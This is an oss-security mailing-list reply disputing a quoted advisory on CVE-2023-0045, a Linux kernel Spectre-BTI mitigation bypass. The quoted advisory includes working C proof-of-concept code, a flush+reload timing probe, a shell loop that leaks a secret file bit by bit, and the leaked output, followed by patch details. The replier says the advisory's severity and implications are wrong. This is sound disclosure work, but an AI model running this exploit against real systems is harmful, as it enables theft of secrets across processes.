Received: (qmail 16212 invoked by uid 550); 3 Feb 2023 19:09:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9274 invoked from network); 3 Feb 2023 19:00:08 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=kernelhacking-com.20210112.gappssmtp.com; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :from:to:cc:subject:date:message-id:reply-to;
        bh=+L7iAb1GPUwYC6R238w1nQFSOPvONCm8VcSwy1VhPcY=;
        b=hSxqKTXH9hl9d4Utf707cYLr55cXcxKwtroDj/uahTFBoTlDqUIrgOxQzkLfSoKWY3
         EpletNE7VqgEblRYVXyAQO2ygi8W+B+o0Ekx8TnIFjrBRn9nRcsfPqiyo73XWlFkeMae
         vQqCE5vturJLL6qekZCZN5p5r7uMwvadC6q16g9Id+rKCNJRR4bm2FaPirY6RqxQbGu0
         1Y3udGC0hsm4C0zfAucrH0TQTTYmX9NVFkzSzAkQp7BgBaMDAGGCuWYyc5pha1u+cb+v
         IjkH01JeFu8YSMwxXZZQ0TpVsmuj08kozYQ07LvxA7j0Ncc8HXzZY9OsK+YeUDkpArxR
         gUuw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=+L7iAb1GPUwYC6R238w1nQFSOPvONCm8VcSwy1VhPcY=;
        b=sqRwS7KdheV8Wk5LFfBB/9GD/9N72RKrmBNTGDnq+9vXRNgIISwLedX6SKw66Jd8pT
         mFa7+v+ORBcVMECLWdvwCtkj26YeenG4aIAjItw901ghIBHrnsjh2/7AbZs4zFjbNoDC
         XBqF9oqejs+0sGY47O18F6byVytm/U5FwViaS0FN5B+hhRfU2AasePJPmWDNsuOeNu+x
         GJCT9Oc3/mHWD/I7gfUemkTJrq0Qjp1HZUOlcfseZE6WlHNwFws8QTl9ES+gm2l8MpSG
         K33U73lvAW9hH5jB32Pc7HUsPdroTTGzjpG6DbhcaA1zhWOGTIEMyNu5Z+b1H99OifY1
         fwNw==
X-Gm-Message-State: AO0yUKUtoMlbbo8PHy3lm2JZDQh8wUTPP9dITqb+2Mz7AwM5VC+JD1/d
	azRZDslDrg7bW6Fwr5MnrmBNEnLDMEFs0YY8JVAvOBiXPGKq8g==
X-Google-Smtp-Source: AK7set/t60grjx9/OihS2LEnLncEz+kcXTO0tk1Ft7N5OrSj2CtjWzweAyzRYJ9m/oAmnTz10EvnUevQK2FBiPqkP5c=
X-Received: by 2002:a17:906:b58:b0:88c:6518:9832 with SMTP id
 v24-20020a1709060b5800b0088c65189832mr3008991ejg.246.1675450796096; Fri, 03
 Feb 2023 10:59:56 -0800 (PST)
MIME-Version: 1.0
References: <CAFXgH+NM7C5r0sVf52ZvO+=vP5sC6=BPBO2paJQN19H5KZcB_Q@mail.gmail.com>
In-Reply-To: <CAFXgH+NM7C5r0sVf52ZvO+=vP5sC6=BPBO2paJQN19H5KZcB_Q@mail.gmail.com>
From: Rodrigo Branco <rodrigo@kernelhacking.com>
Date: Fri, 3 Feb 2023 10:59:43 -0800
Message-ID: <CAL6-1qUipy9eFMEH9=mVsnpyAtwcfNf8oFx9BVvqz89sfu2MkQ@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="0000000000008a521405f3d0493e"
Subject: Re: [oss-security] CVE-2023-0045: Linux Kernel: Bypassing Spectre-BTI
 User Space Mitigations

--0000000000008a521405f3d0493e
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

I am sorry but that is not Jose's and mine write-up.  We disagree
vehemently with the severity of the issue marked as high. Also, the
description, implications and target are all wrong.

I will work with Google folks to send an updated version but recommend that
others ignore the conclusions and implications for now.  I am available if
anyone needs to discuss further.


Best regards,

On Fri, Feb 3, 2023, 10:20 AM Rafael Correa De Ysasi <
rcorreadeysasi@chromium.org> wrote:

> Summary
>
> The Linux kernel does not correctly mitigate SMT attacks, as discovered
> through a strange pattern in the kernel API using STIBP as a mitigation[1
> <https://docs.kernel.org/userspace-api/spec_ctrl.html>], leaving the
> process exposed for a short period of time after a syscall. The kernel al=
so
> does not issue an IBPB immediately during the syscall.
> The ib_prctl_set [2
> <
> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs=
.c#L1467
> >]function
> updates the Thread Information Flags (TIFs) for the task and updates the
> SPEC_CTRL MSR on the function __speculation_ctrl_update [3
> <
> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.=
c#L557
> >],
> but the IBPB is only issued on the next schedule, when the TIF bits are
> checked. This leaves the victim vulnerable to values already injected on
> the BTB, prior to the prctl syscall.
> The behavior is only corrected after a reschedule of the task happens.
> Furthermore, the kernel entrance (due to the syscall itself), does not
> issue an IBPB in the default scenarios (i.e., when the kernel protects
> itself via retpoline or eIBRS).
> Severity
>
> High - The inability to correctly mitigate SMT attacks, leaves the kernel
> exposed for an attacker to inject malicious code into the running kernel,
> which could lead to a complete compromise of the system.
> Proof of Concept
>
> To ensure this wasn't a measurement error, we created a simple POC. The
> victim code always executes asafe_function through a function pointer that
> is vulnerable to a spectre-BTI attack. The victim requests the kernel for
> protection using the prctl syscall (inside protect_me). The victim also
> loads a secret from a text file, showing that other syscalls don=E2=80=99=
t check
> the TIF bit or provoke a reschedule that would force an IBPB.
>
> //gcc -o victim victim.c -O0 -masm=3Dintel -no-pie -fno-stack-protector
> #include "common.h"
>
> int main(int argc, char *argv[])
> {
>
>     setvbuf(stdout, NULL, _IONBF, 0);
>     printf("running victim %s\n", argv[1]);
>
>     //only call safe_function
>     codePtr =3D safe_function;
>     char secret[20];
>     char *sharedmem =3D open_shared_mem();
>     unsigned idx =3D string_to_unsigned(argv[1]);
>
>     //call for prctl to protect this process
>     protect_me();
>
>     //only then load the secret into memory
>     load_secret(secret);
>
>     for (int i =3D 0; i < 100; i++)
>     {
>         flush((char *)&codePtr);
>         //this arguments are never used on safe_function, but they
> match the signature of spectre_gadget, that should never be called
>         //Since prctl is called, it shouldn't be possible for an
> attacker to poison the BTB and leak the secret
>         spec(&sharedmem[2000], secret, idx);
>     }
> }
>
> Most of the libc functions were placed inside a common header between the
> attacker and the victim, so the spectre_gadget and spec functions share t=
he
> same memory addresses on both victim and attacker (otherwise a .GOT entry
> is created and the addresses are changed). This is not a requirement and
> there are other ways to place the branches on the same addresses and mimic
> the victim context, but this method is the simplest.
>
> #include <stdlib.h>
> #include <sys/mman.h>
> #include <fcntl.h>
> #include <unistd.h>
> #include <stdio.h>
> #include <sys/prctl.h>
>
> char unused[0x1000];
> void (*codePtr)(char *, char *, unsigned idx);
> char unused2[0x1000];
>
> // this function does nothing. Always called by the victim
> void safe_function(char *a, char *b, unsigned idx)
> {
> }
>
> // this function is never called by the victim
> void spectre_gadget(char *addr, char *secret, unsigned idx)
> {
>     volatile char d;
>     if ((secret[idx / 8] >> (idx % 8)) & 1)
>         d =3D *addr;
> }
>
> // helper for better results probably not necessary but makes the tests
> easier
> void flush(char *adrs)
> {
>     asm volatile(
>         "clflush [%0]                   \n"
>         :
>         : "c"(adrs)
>         :);
> }
>
> // This function is vulnerable to a spectre-BTI attack.
> void spec(char *addr, char *secret, unsigned idx)
> {
>
>     for (register int i =3D 0; i < 30; i++)
>         ;
>     codePtr(addr, secret, idx);
> }
>
> // opens file as read only in memory to be used as side channel, but
> could be any other COW file like libc for example
> char *open_shared_mem()
> {
>     int fd =3D open("sharedmem", O_RDONLY);
>     char *res =3D (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, =
0);
>     // ensure page is on memory
>     volatile char d =3D res[2100];
>     return res;
> }
>
> // load secret from file
> void load_secret(char *secret)
> {
>     FILE *fp =3D fopen("secret.txt", "r");
>     fgets(secret, 20, (FILE *)fp);
> }
>
> // Calls prctl to protect the user against spectre-BTI attacks -
> https://docs.kernel.org/userspace-api/spec_ctrl.html
> void protect_me()
> {
>     usleep(1000); //not needed but resets the available time on scheduler
>     prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
> PR_SPEC_FORCE_DISABLE, 0, 0);
> }
>
> // Utility. All utility functions are placed on common so the spec
> function matches the same address on both victim and attacker. This is
> not necessary but makes the tests easier
> unsigned string_to_unsigned(char *s)
> {
>     return atoi(s);
> }
>
>
> The attack consists in poisoning the BTB by calling the spec function and
> making it branch to spectre_gadget instead of safe_function. After the
> training the victim process is created and it executes spec that
> mispredicts to spectre_gadget which should never be executed. The secret =
is
> leaked through a classic flush+reload side channel.
>
> //gcc -o attacker attacker.c -O0 -masm=3Dintel -no-pie -fno-stack-protect=
or
> #include "common.h"
>
> #define PRINTNUM 1000
>
> unsigned probe(char *adrs)
> {
>     volatile unsigned long time;
>     asm __volatile__(
>         "    mfence             \n"
>         "    lfence             \n"
>         "    rdtsc              \n"
>         "    lfence             \n"
>         "    mov esi, eax       \n"
>         "    mov eax,[%1]       \n"
>         "    lfence             \n"
>         "    rdtsc              \n"
>         "    sub eax, esi       \n"
>         "    clflush [%1]       \n"
>         "    mfence             \n"
>         "    lfence             \n"
>         : "=3Da"(time)
>         : "c"(adrs)
>         : "%esi", "%edx");
>     return time;
> }
>
> int main(int argc, char *argv[])
> {
>
>     //Make spec function confuse safe_function with spectre_gadget
>     codePtr =3D spectre_gadget;
>
>     char dummy;
>     int hits =3D 0;
>     int tries =3D 0;
>     char *sharedmem =3D open_shared_mem();
>     setvbuf(stdout, NULL, _IONBF, 0);
>
>     while (1)
>     {
>         //Inject the target in the BTB
>         spec(&dummy, &dummy, 0);
>
>         //Allow for victim to execute and misspredict to spectre_gadget
>         usleep(1);
>
>         //probe the 1-bit flush+reload side channel
>         if (probe((char *)&sharedmem[2000]) < 0x90)
>         {
>             printf("+");
>         }
>     }
> }
>
> Since the victim receives an argument that can be used to choose the bit =
to
> be leaked through the side channel, we can execute the victim process
> multiple times while the attacker is executing:
>
> taskset -c 0 ./attacker >> result.txt &
>
> for i in {0..144}
> do
>     echo "Leaking bit $i... "
>     echo -e -n "Leaking bit $i: " >> result.txt
>     sleep .01
>     for j in {0..10}
>     do
>         taskset -c 0 ./victim $i >/dev/null
>     done
>
>     echo "" >> result.txt
> done
>
> python3 parseResult.py
>
> make clean
> echo -e "killing attacker"
> kill -9 $(pidof attacker)
>
> This leaves the following text file:
>
> Leaking bit 0: +++++++++++
> Leaking bit 1:
> Leaking bit 2:
> Leaking bit 3:
> Leaking bit 4:
> Leaking bit 5:
> Leaking bit 6: ++++++++++
> Leaking bit 7:
> Leaking bit 8: ++++++++
> [...]
>
> Note that bit 0 and 6 are 1, therefore the first character must be 0x41(A=
).
> Parsing the file with a simple Python script shows:The secret leaked is:
> b'Asuper_secret_flag' which is the exact content present in secret.txt us=
ed
> by the victim.
> Changing the prctl call for seccomp to
> syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0); after loading the secret
> doesn't prevent the attack. This is expected since internally both use the
> same ib_prctl_set function to implement the mitigation.
> Further Analysis
>
> The current implementation of the prctl syscall for speculative control
> fails to protect the user against attackers executing before the
> mitigation. The seccomp mitigation also fails in this scenario.
> The patch that added support for the conditional mitigation via prctl
> (ib_prctl_set) dates back to the kernel 4.9.176. It appears to have been
> introduced on Nov 28, 2018 in the following commit: torvalds/linux@9137bb2
> <
> https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241=
fa3a694f
> >
> and
> the current __speculation_ctrl_update code that sets the MSRs, but without
> the immediate IBPB, was added on the same day in the following commit:
> torvalds/linux@01daf56
> <
> https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb36=
9b45dfa5
> >.
> This indicates that the issue has been present in the kernel for about 4
> years.
> Mitigations
>
> For user-mode applications, a usleep after the prctl call is enough to
> force a reschedule and ensure the correct mitigation. One possible kernel
> patch for this attack is to issue the IBPB just after the STIBP is set, on
> __speculation_ctrl_update [3
> <
> https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.=
c#L557
> >]
> or to call schedule(). After discussing with the Linux Kernel Security
> Team, that is what was decided, and the following commit has the fix:
>
> https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=3D=
a664ec9158eeddd75121d39c9a0758016097fa96
> .
> Patch
>
> This was addressed in the following [commit].(
>
> https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/a=
rch/x86/kernel/cpu/bugs.c?h=3Dv6.1.9&id=3De8377f0456fb6738a4668d4df16c13d75=
99925fd
> )
> Timeline
>
> *Date reported*: 12/30/2022
> *Date fixed*: 01/04/2023
> *Date disclosed*: 02/03/2023
>

--0000000000008a521405f3d0493e--
